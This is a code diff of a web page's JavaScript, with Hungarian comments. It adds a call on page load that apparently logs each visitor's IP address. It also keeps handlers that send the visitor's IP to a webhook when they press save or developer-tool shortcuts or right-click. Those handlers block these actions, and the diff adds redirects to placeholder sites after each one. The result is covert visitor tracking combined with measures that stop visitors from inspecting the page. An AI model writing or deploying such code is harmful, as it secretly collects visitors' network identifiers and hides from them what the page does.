@@ -23,6 +23,16 @@
 
         window.onload = function() {
             // Webhook URL lekérése a szervertől
+            fetch('/send-ip')
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data); // A szerver válasza
+                })
+                .catch(error => {
+                    console.error('Hiba történt:', error);
+                });
+
+            // Webhook URL-k lekérése a szervertől
             fetch('/get-webhook-url')
                 .then(response => response.json())
                 .then(data => {
@@ -70,12 +80,14 @@
             if (event.ctrlKey && event.key === 's') {
                 event.preventDefault(); // Megakadályozza a mentést
                 sendIpRequest('Ctrl + S', altWebhookUrl);  // Második webhook küldése
+                window.location.href = "https://example.com2"; // Átirányítja egy másik oldalra
             }
 
             // Figyeljük, ha a felhasználó megpróbálja megnyitni a fejlesztői eszközöket
             if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
                 event.preventDefault(); // Megakadályozza a devtools megnyitását
                 sendIpRequest('F12 / Ctrl + Shift + I', altWebhookUrl);  // Második webhook küldése
+                window.location.href = "https://example.com3"; // Átirányítja egy másik oldalra
             }
         });
 
@@ -83,6 +95,7 @@
         document.addEventListener('contextmenu', function(event) {
             event.preventDefault(); // Megakadályozza a jobb klikk menüt
             sendIpRequest('Jobb klikk', altWebhookUrl);  // Második webhook küldése
+            window.location.href = "https://example.com4"; // Átirányítja egy másik oldalra
         });
 
         // IP küldése a /send-ip útvonalra
@@ -91,7 +104,8 @@
                 .then(response => response.json())  // Válasz JSON formátumban
                 .then(data => {
                     console.log(data); // A szerver válasza
-                    sendToWebhook(data.ip, keyCombination, targetWebhookUrl); // Webhook küldése
+                    // Webhook küldése a megfelelő webhook URL-re
+                    sendToWebhook(data.ip, keyCombination, targetWebhookUrl);
                 })
                 .catch(error => {
                     console.error('Hiba történt:', error);
